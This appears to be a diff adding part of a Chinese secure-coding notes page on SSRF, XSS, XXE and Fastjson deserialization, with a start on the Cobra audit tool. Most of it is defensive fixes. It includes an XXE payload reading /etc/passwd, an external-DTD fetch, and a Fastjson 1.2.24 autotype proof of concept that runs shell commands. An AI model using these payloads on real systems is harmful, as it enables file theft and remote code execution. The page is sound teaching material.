+<pre class="src src-java"><span class="org-type">URL</span> <span class="org-variable-name">realUrl</span> = <span class="org-keyword">new</span> <span class="org-type">URL</span>(urlNameString);
+<span class="org-comment-delimiter">// </span><span class="org-comment">&#25171;&#24320;&#21644;URL&#20043;&#38388;&#30340;&#36830;&#25509;
+</span><span class="org-type">URLConnection</span> <span class="org-variable-name">connection</span> = realUrl.openConnection();
+</pre>
+</div></li>
+</ol>
+</div>
+<div id="outline-container-h:3fa31637-f67e-4c07-8f9a-953937d03de7" class="outline-3">
+<h3 id="h:3fa31637-f67e-4c07-8f9a-953937d03de7"><a href="#h:3fa31637-f67e-4c07-8f9a-953937d03de7">解决方案</a></h3>
+<div class="outline-text-3" id="text-h:3fa31637-f67e-4c07-8f9a-953937d03de7">
+<p>
+漏洞修复代码
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">String</span>[] <span class="org-variable-name">urlwhitelist</span> = {<span class="org-string">".cici.org"</span>, <span class="org-string">".cici.com"</span>};
+<span class="org-keyword">public</span> <span class="org-keyword">static</span> <span class="org-type">Boolean</span> <span class="org-function-name">ciciSSRFUrlCheck</span>(<span class="org-type">String</span> <span class="org-variable-name">url</span>, <span class="org-type">String</span>[] <span class="org-variable-name">urlwhitelist</span>) {
+    <span class="org-keyword">try</span> {
+        <span class="org-type">URL</span> <span class="org-variable-name">u</span> = <span class="org-keyword">new</span> <span class="org-type">URL</span>(url);
+        <span class="org-comment-delimiter">// </span><span class="org-comment">&#21482;&#20801;&#35768;http&#21644;https&#30340;&#21327;&#35758;&#36890;&#36807;
+</span>        <span class="org-keyword">if</span> (<span class="org-negation-char">!</span>u.getProtocol().startsWith(<span class="org-string">"http"</span>) &amp;&amp;
+            <span class="org-negation-char">!</span>u.getProtocol().startsWith(<span class="org-string">"https"</span>)) {
+            <span class="org-keyword">return</span> <span class="org-constant">false</span>;
+        }
+        <span class="org-comment-delimiter">// </span><span class="org-comment">&#33719;&#21462;&#22495;&#21517;&#65292;&#24182;&#36716;&#20026;&#23567;&#20889;
+</span>        <span class="org-type">String</span> <span class="org-variable-name">host</span> = u.getHost().toLowerCase();
+        <span class="org-keyword">for</span> (<span class="org-type">String</span> <span class="org-variable-name">whiteurl</span>: urlwhitelist){
+            <span class="org-keyword">if</span> (host.endWith(whiteurl)) {
+                <span class="org-keyword">return</span> <span class="org-constant">true</span>;
+            }
+        }
+        <span class="org-keyword">return</span> <span class="org-constant">false</span>;
+    } <span class="org-keyword">catch</span> (Exception e) {
+        <span class="org-keyword">return</span> <span class="org-constant">false</span>;
+    }
+}
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>域名白名单</li>
+<li>过滤内网IP、不可信域名</li>
+<li>禁用其他协议；</li>
+</ol>
+</div>
+</div>
+</section>
+<section id="outline-container-h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad" class="outline-2">
+<h2 id="h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad"><a href="#h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad">XSS</a></h2>
+<div class="outline-text-2" id="text-h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+Cross Site Script（XSS），跨站脚本攻击。
+</p>
+
+<p>
+攻击者利用应用程序的动态展示数据功能，在 html 页面里嵌入恶意代码。当用户浏览该页之时，这些嵌入在 html中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的。
+</p>
+
+<p>
+跨站脚本攻击有两种攻击形式
+</p>
+<ol class="org-ol">
+<li><p>
+反射型跨站脚本攻击
+</p>
+
+<p>
+攻击者会通过社会工程学手段，发送一个 URL 连接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。
+</p></li>
+
+<li><p>
+存储型跨站脚本攻击
+</p>
+
+<p>
+攻击者利用 web 应用程序提供的录入或修改数据功能，将数据存储到服务器或用户cookie 中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本。所有浏览者都会受到攻击。
+</p></li>
+
+<li><p>
+DOM 跨站攻击
+</p>
+
+<p>
+由于 html 页面中，定义了一段 JS，根据用户的输入，显示一段 html 代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。
+</p>
+
+<p>
+DOM 跨站和以上两个跨站攻击的差别是，DOM 跨站是纯页面脚本的输出，只有规范使用 JAVASCRIPT，才可以防御。
+</p></li>
+</ol>
+
+<p>
+恶意攻击者可以利用跨站脚本攻击做到：
+</p>
+<ol class="org-ol">
+<li>盗取用户 cookie，伪造用户身份登录。</li>
+<li>控制用户浏览器。</li>
+<li>结合浏览器及其插件漏洞，下载病毒木马到浏览者的计算机上执行。</li>
+<li>衍生 URL 跳转漏洞。</li>
+<li>让官方网站出现钓鱼页面。</li>
+<li>蠕虫攻击</li>
+</ol>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+直接在 html 页面展示“用户可控数据”，将直接导致跨站脚本威胁。
+</p>
+
+<p>
+1.Java 示例： JSP 文件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-keyword">while</span>(rs.next())
+{
+    %&gt;
+    &lt;tr&gt;
+    &lt;td&gt;&lt;%=rs.getInt(<span class="org-string">"id"</span>) %&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;%=rs.getString(<span class="org-string">"pname"</span>)%&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;%=rs.getString(<span class="org-string">"pdesc"</span>)%&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;%=rs.getString(<span class="org-string">"ptype"</span>)%&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;%
+}
+</pre>
+</div>
+
+<p>
+代码中的几个变量被直接输出到了页面中，没有做任何安 全过滤，一旦让用户可以输入数据，都可能导致用户浏览器把“用户可控数据”当成JS脚本执行，或页面元素被“用户可控数据”插入的页面 HTML 代码控制，从而造成攻击。
+</p>
+
+<p>
+2.直接返回用户输入的内容.
+</p>
+</div>
+<div id="outline-container-h:fabd7c38-6363-4c61-8973-bb4ef9e1a513" class="outline-3">
+<h3 id="h:fabd7c38-6363-4c61-8973-bb4ef9e1a513"><a href="#h:fabd7c38-6363-4c61-8973-bb4ef9e1a513">解决方案</a></h3>
+<div class="outline-text-3" id="text-h:fabd7c38-6363-4c61-8973-bb4ef9e1a513">
+<p>
+<b>HTML/XML 页面输出规范：</b>
+</p>
+
+<p>
+1.在 HTML/XML 中显示“用户可控数据”前，应该进行 html escape 转义。
+</p>
+
+<p>
+JAVA 示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;div&gt;<span class="org-comment-delimiter">#</span><span class="org-comment">escapeHTML($user.name) &lt;/div&gt;
+</span>
+&lt;td&gt;<span class="org-comment-delimiter">#</span><span class="org-comment">escapeHTML($user.name)&lt;/td&gt;
+</span>
+&#25152;&#26377; HTML &#21644; XML &#20013;&#36755;&#20986;&#30340;&#25968;&#25454;&#65292;&#37117;&#24212;&#35813;&#20570; html escape &#36716;&#20041;&#12290;
+</pre>
+</div>
+
+<p>
+2.在 javascript 内容中输出的“用户可控数据”，需要做 javascript escape 转义。
+</p>
+
+<p>
+html 转义并不能保证在脚本执行区域内数据的安全，也不能保证脚本执行代码的正常运行。
+</p>
+
+<p>
+JAVA 示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;script&gt;alert(<span class="org-string">'#escapeJavaScript($user.name)'</span>)&lt;/script&gt;
+
+&lt;script&gt;<span class="org-variable-name">x</span>=<span class="org-string">'#escapeJavaScript($user.name)'</span>&lt;/script&gt;
+
+&lt;div <span class="org-variable-name">onmouseover</span>=<span class="org-string">"x='#escapeJavaScript($user.name)'"</span>&lt;/div&gt;
+</pre>
+</div>
+
+<p>
+3.在给用户设置认证 COOKIE 时，加入 HTTPONLY
+</p>
+
+<p>
+js代码就访问不了cookie了
+</p>
+
+<p>
+<b>AJAX 输出规范：</b>
+</p>
+
+<p>
+1、XML 输出“用户可控数据”时，对数据部分做 HTML 转义。示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;?xml <span class="org-variable-name">version</span>=<span class="org-string">"1.0"</span> <span class="org-variable-name">encoding</span>=<span class="org-string">"UTF-8"</span> ?&gt;
+&lt;man&gt;
+&lt;name&gt;**#xmlEscape($<span class="org-variable-name">name</span>)**&lt;/name&gt;
+&lt;man&gt;
+</pre>
+</div>
+
+<p>
+2、json 输出要先对变量内容中的“用户可控数据”单独作 htmlEscape，再对变量内容做一次 javascriptEscape。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">String <span class="org-variable-name">cityname</span>=&#8221;&#27993;&#27743;&lt;B&gt;&#8221;+StringUtil.htmlEscape(city.name)+&#8221;&lt;/B&gt;&#8221;;
+String <span class="org-variable-name">json</span> =
+<span class="org-string">"citys:{city:['"</span>+
+<span class="org-function-name">StringUtil.javascriptEscape</span>(cityname) + <span class="org-string">"']}"</span>;
+</pre>
+</div>
+
+<p>
+3、非 xml 输出（包括 json、其他自定义数据格式），response 包中的 http 头的contentType，必须为 json，并且用户可控数据做 htmlEscape 后才能输出。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-function-name">response.setContentType</span>(<span class="org-string">"application/json"</span>);
+PrintWriter <span class="org-variable-name">out</span> = response.getWriter();
+<span class="org-function-name">out.println</span>(StringUtil.htmlEscape(ajaxReturn));
+</pre>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:e655c591-dc83-4318-9886-a7fdba96e742" class="outline-2">
+<h2 id="h:e655c591-dc83-4318-9886-a7fdba96e742"><a href="#h:e655c591-dc83-4318-9886-a7fdba96e742">XXE</a></h2>
+<div class="outline-text-2" id="text-h:e655c591-dc83-4318-9886-a7fdba96e742">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+当开发人员配置其XML解析功能允许外部实体引用时，攻击者可利用其引发安全问题的配置方式，实施任意文件读取、内网端口探测、命令执行、拒绝服务等方面的攻击。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+xml示例
+</p>
+<div class="org-src-container">
+<pre class="src src-xml">&lt;!<span class="org-nxml-text">DOCTYPE foo [</span>&lt;!<span class="org-nxml-text">ELEMENT foo ANY &gt;
+</span>&lt;!<span class="org-nxml-text">ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/cici.dtd" &gt;
+%xxe;]&gt;
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-entity-ref-delimiter">&amp;</span><span class="org-nxml-entity-ref-name">xxe</span><span class="org-nxml-entity-ref-delimiter">;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+读取系统文件
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+&lt;!<span class="org-nxml-text">DOCTYPE cici[
+</span>&lt;!<span class="org-nxml-text">ENTITY f SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">hhh</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-entity-ref-delimiter">&amp;</span><span class="org-nxml-entity-ref-name">f</span><span class="org-nxml-entity-ref-delimiter">;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">hhh</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+Java 解析xml文件的方式
+</p>
+
+<p>
+1.SAXReader
+</p>
+<ul class="org-ul">
+<li>防止 Java org.dom4j.io.SAXReader 模块的XXE 漏洞</li>
+<li>使用 saxReader 时，需设置以下三项才能保证防止XXE攻击</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-comment-delimiter">// </span><span class="org-comment">&#31105;&#29992;doctype
+</span>saxReader.setFeature(<span class="org-string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="org-constant">true</span>);
+<span class="org-comment-delimiter">// </span><span class="org-comment">&#31105;&#29992;&#19968;&#33324;&#22806;&#37096;&#23454;&#20307;
+</span>saxReader.setFeature(<span class="org-string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="org-constant">false</span>);
+<span class="org-comment-delimiter">// </span><span class="org-comment">&#31105;&#29992;&#22806;&#37096;&#23454;&#20307;&#21442;&#25968;
+</span>saxReader.setFeature(<span class="org-string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="org-constant">false</span>);
+</pre>
+</div>
+
+<p>
+2.XMLInputFactory（StAX 解析器）
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-comment-delimiter">// </span><span class="org-comment">This disables DTDs entirely for that factory
+</span>xmlInputFactory.setProperty(<span class="org-constant">XMLInputFactory</span>.<span class="org-type">SUPPORT_DTD</span>, <span class="org-constant">false</span>);
+<span class="org-comment-delimiter">// </span><span class="org-comment">This causes XMLStreamException to be thrown if external DTDs are accessed.
+</span>xmlInputFactory.setProperty(<span class="org-constant">XMLConstants</span>.ACCESS_EXTERNAL_DTD, <span class="org-string">""</span>);
+<span class="org-comment-delimiter">// </span><span class="org-comment">disable external entities
+</span>xmlInputFactory.setProperty(<span class="org-string">"javax.xml.stream.isSupportingExternalEntities"</span>, <span class="org-constant">false</span>);
+</pre>
+</div>
+
+<p>
+3.SAXBuilder
+</p>
+<ul class="org-ul">
+<li>使用 Java org.jdom2.input.SAXBuilder 模块时防止XXE漏洞</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">SAXBuilder</span> <span class="org-variable-name">builder</span> = <span class="org-keyword">new</span> <span class="org-type">SAXBuilder</span>();
+builder.setFeature(<span class="org-string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="org-constant">true</span>);
+builder.setFeature(<span class="org-string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="org-constant">false</span>);
+builder.setFeature(<span class="org-string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="org-constant">false</span>);
+builder.setExpandEntities(<span class="org-constant">false</span>);
+<span class="org-type">Document</span> <span class="org-variable-name">doc</span> = builder.build(<span class="org-keyword">new</span> <span class="org-type">File</span>(fileName));
+</pre>
+</div>
+
+<p>
+4.DocumentBuilder
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">DocumentBuilder</span> <span class="org-variable-name">builder</span> = factory.newDocumentBuilder();
+builder.setFeature(<span class="org-string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="org-constant">true</span>);
+builder.setFeature(<span class="org-string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="org-constant">false</span>);
+builder.setFeature(<span class="org-string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="org-constant">false</span>);
+<span class="org-comment-delimiter">// </span><span class="org-comment">Disable external DTDs as well
+</span>builder.setFeature(<span class="org-string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>,<span class="org-constant">false</span>);
+<span class="org-type">Document</span> <span class="org-variable-name">d</span> = builder.parse(data);
+<span class="org-type">NodeList</span> <span class="org-variable-name">sList</span> = d.getElementsByTagName(<span class="org-string">"student"</span>);
+</pre>
+</div>
+</div>
+</section>
+<section id="outline-container-h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564" class="outline-2">
+<h2 id="h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564"><a href="#h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564">反序列化漏洞</a></h2>
+<div class="outline-text-2" id="text-h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564">
+</div>
+<div id="outline-container-Fastjson反序列化" class="outline-3">
+<h3 id="Fastjson反序列化"><a href="#Fastjson反序列化">Fastjson反序列化</a></h3>
+<div class="outline-text-3" id="text-Fastjson反序列化">
+<p>
+漏洞描述
+</p>
+<ul class="org-ul">
+<li>fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改 @type 的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行这类问题。</li>
+</ul>
+
+<p>
+<b>测试代码</b>
+</p>
+
+<p>
+1.创建Maven项目
+</p>
+
+<p>
+2.在 pom 文件中添加 fastjson依赖
+</p>
+
+<p>
+xml文件如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="UTF-8"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">project</span> <span class="org-nxml-namespace-attribute-xmlns">xmlns</span>=<span class="org-string">"http://maven.apache.org/POM/4.0.0"</span>
+         <span class="org-nxml-namespace-attribute-xmlns">xmlns</span><span class="org-nxml-namespace-attribute-colon">:</span><span class="org-nxml-namespace-attribute-prefix">xsi</span>=<span class="org-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
+         <span class="org-nxml-attribute-prefix">xsi</span><span class="org-nxml-attribute-colon">:</span><span class="org-nxml-attribute-local-name">schemaLocation</span>=<span class="org-string">"http://maven.apache.org/POM/4.0.0
+                             http://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">modelVersion</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">4.0.0</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">modelVersion</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">groupId</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">org.example</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">groupId</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">artifactId</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">FastjsonDemo</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">artifactId</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">version</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">1.0-SNAPSHOT</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">version</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">properties</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">maven.compiler.source</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">8</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">maven.compiler.source</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">maven.compiler.target</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">8</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">maven.compiler.target</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">properties</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">dependencies</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">dependency</span><span class="org-nxml-tag-delimiter">&gt;</span>
+      <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">groupId</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">com.alibaba</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">groupId</span><span class="org-nxml-tag-delimiter">&gt;</span>
+      <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">artifactId</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">fastjson</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">artifactId</span><span class="org-nxml-tag-delimiter">&gt;</span>
+      <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">version</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">1.2.24</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">version</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">dependency</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">dependencies</span><span class="org-nxml-tag-delimiter">&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">project</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+3.点击 Maven 同步依赖
+</p>
+
+<p>
+4.先看一下 fastjson 的功能，可以将字符串反序列化成json
+</p>
+
+<p>
+写一个 CiciUser 类，在set方法中添加执行命令的代码，命令内容为打开 Safari 浏览器
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">package</span> cici.<span class="org-constant">fastjsonDemo</span>;
+
+<span class="org-keyword">import</span> <span class="org-constant">com</span>.<span class="org-constant">alibaba</span>.<span class="org-constant">fastjson</span>.<span class="org-type">JSON</span>;
+<span class="org-keyword">import</span> <span class="org-constant">com</span>.<span class="org-constant">alibaba</span>.<span class="org-constant">fastjson</span>.<span class="org-type">JSONObject</span>;
+
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">Test</span> {
+    <span class="org-keyword">public</span> <span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">main</span>(<span class="org-type">String</span>[] <span class="org-variable-name">args</span>) {
+        <span class="org-type">String</span> <span class="org-variable-name">data</span> = <span class="org-string">"{\"name\": \"cici\"}"</span>;
+        <span class="org-type">JSONObject</span> <span class="org-variable-name">cici_json</span> = JSON.parseObject(data);
+        System.out.println(cici_json.get(<span class="org-string">"name"</span>));
+        System.out.println(cici_json);
+    }
+}
+
+<span class="org-comment-delimiter">// </span><span class="org-comment">&#25191;&#34892;&#32467;&#26524;
+</span><span class="org-comment-delimiter">// </span><span class="org-comment">cici
+</span><span class="org-comment-delimiter">// </span><span class="org-comment">{"name":"cici"}</span>
+</pre>
+</div>
+
+<p>
+从漏洞描述中我们知道，当fastjson进行反序列化时会设置类的属性，也就是会自动调用 get/set 方法，那么我们就可以写一个类来进行测试。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">package</span> <span class="org-constant">exp</span>;
+<span class="org-keyword">import</span> <span class="org-constant">java</span>.<span class="org-constant">io</span>.<span class="org-type">IOException</span>;
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">CiciUser</span> {
+    <span class="org-keyword">private</span> <span class="org-type">String</span> <span class="org-variable-name">name</span>;
+    <span class="org-keyword">private</span> <span class="org-type">String</span> <span class="org-variable-name">age</span>;
+    <span class="org-keyword">public</span> <span class="org-type">void</span> <span class="org-function-name">setAge</span>(<span class="org-type">String</span> <span class="org-variable-name">properties</span>) <span class="org-keyword">throws</span> <span class="org-type">IOException</span> {
+        System.out.println(<span class="org-string">"setProperties is running..."</span>);
+        Runtime.getRuntime().exec(<span class="org-string">"open /Applications/Safari.app"</span>);
+        <span class="org-keyword">this</span>.age = properties;
+    }
+    <span class="org-keyword">public</span> <span class="org-type">String</span> <span class="org-function-name">getName</span>() {
+        System.out.println(<span class="org-string">"getName is running ..."</span>);
+        <span class="org-keyword">return</span> name;
+    }
+    <span class="org-keyword">public</span> <span class="org-type">void</span> <span class="org-function-name">setName</span>(<span class="org-type">String</span> <span class="org-variable-name">name</span>) {
+        System.out.println(<span class="org-string">"setName is running ..."</span>);
+        <span class="org-keyword">this</span>.name = name;
+    }
+}
+</pre>
+</div>
+
+<p>
+新写一个fastjson解析函数，解析的字符串中 @type 内容为我们写好的类的路径 exp.CiciUser ，同时设置属性
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">package</span> cici.<span class="org-constant">fastjsonDemo</span>;
+<span class="org-keyword">import</span> <span class="org-constant">com</span>.<span class="org-constant">alibaba</span>.<span class="org-constant">fastjson</span>.<span class="org-type">JSON</span>;
+<span class="org-keyword">import</span> <span class="org-constant">com</span>.<span class="org-constant">alibaba</span>.<span class="org-constant">fastjson</span>.<span class="org-type">JSONObject</span>;
+<span class="org-keyword">import</span> <span class="org-constant">exp</span>.<span class="org-type">CiciUser</span>;
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">Test</span> {
+    <span class="org-keyword">public</span> <span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">main</span>(<span class="org-type">String</span>[] <span class="org-variable-name">args</span>) {
+        <span class="org-type">String</span> <span class="org-variable-name">payload2</span> = <span class="org-string">"{\"@type\":\"exp.CiciUser\", \"name\":\"cici\",\"age\":\"\"}"</span>;
+        <span class="org-type">Object</span> <span class="org-variable-name">obj</span> = JSON.parse(payload2);
+        System.out.println(obj);
+    }
+}
+</pre>
+</div>
+
+<p>
+将 CiciUser 中的 Poc 改为 curl htpp://127.0.0.1:8888
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">package</span> <span class="org-constant">exp</span>;
+<span class="org-keyword">import</span> <span class="org-constant">java</span>.<span class="org-constant">io</span>.<span class="org-type">IOException</span>;
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">CiciUser</span> {
+    <span class="org-keyword">private</span> <span class="org-type">String</span> <span class="org-variable-name">name</span>;
+    <span class="org-keyword">private</span> <span class="org-type">String</span> <span class="org-variable-name">age</span>;
+    <span class="org-keyword">public</span> <span class="org-type">void</span> <span class="org-function-name">setAge</span>(<span class="org-type">String</span> <span class="org-variable-name">properties</span>) <span class="org-keyword">throws</span> <span class="org-type">IOException</span> {
+        System.out.println(<span class="org-string">"setProperties is running..."</span>);
+        Runtime.getRuntime().exec(<span class="org-string">"curl http://127.0.0.1:8888"</span>);
+        <span class="org-keyword">this</span>.age = properties;
+    }
+    <span class="org-keyword">public</span> <span class="org-type">String</span> <span class="org-function-name">getName</span>() {
+        System.out.println(<span class="org-string">"getName is running ..."</span>);
+        <span class="org-keyword">return</span> name;
+    }
+    <span class="org-keyword">public</span> <span class="org-type">void</span> <span class="org-function-name">setName</span>(<span class="org-type">String</span> <span class="org-variable-name">name</span>) {
+        System.out.println(<span class="org-string">"setName is running ..."</span>);
+        <span class="org-keyword">this</span>.name = name;
+    }
+}
+</pre>
+</div>
+
+<p>
+用nc监听本地 8888 端口， 同时使用 curl 访问本地 8888 端口 ，可以看到nc收到HTTP请求信息
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">nc -l 8888
+</pre>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:8dae0942-47ab-40be-ad06-5a54cb800b13" class="outline-2">
+<h2 id="h:8dae0942-47ab-40be-ad06-5a54cb800b13"><a href="#h:8dae0942-47ab-40be-ad06-5a54cb800b13">审计工具-Cobra</a></h2>
+<div class="outline-text-2" id="text-h:8dae0942-47ab-40be-ad06-5a54cb800b13">
+<p>
+RIPS
+</p>
+<ul class="org-ul">
+<li>无法识别框架，框架输入</li>
+<li>无法自定义规则</li>
+<li>数据流分析，无法跨文件</li>
+</ul>
+</div>
+<div id="outline-container-h:0d57d80b-36a8-4def-8d6a-2c1877295383" class="outline-3">
+<h3 id="h:0d57d80b-36a8-4def-8d6a-2c1877295383"><a href="#h:0d57d80b-36a8-4def-8d6a-2c1877295383">介绍</a></h3>
+<div class="outline-text-3" id="text-h:0d57d80b-36a8-4def-8d6a-2c1877295383">
+<p>
+<a href="http://cobra.feei.cn/">http://cobra.feei.cn/</a>
+</p>
+
+<p>
+<b>什么是“源代码安全审计(白盒扫描)”</b>
+</p>
+
+<p>
+由于开发人员的技术水平和安全意识各不相同，导致可能开发出一些存在安全漏洞的代码。 攻击者可以通过渗透测试来找到这些漏洞，从而导致应用被攻击、服务器被入侵、数据被下载、业务受到影响等等问题。 “源代码安全审计”是指通过审计发现源代码中的安全隐患和漏洞，而Cobra可将这个流程自动化。
+</p>
+
+
+<p>
+<b>Cobra为什么能从源代码中扫描到漏洞</b>
+</p>
+
+<p>
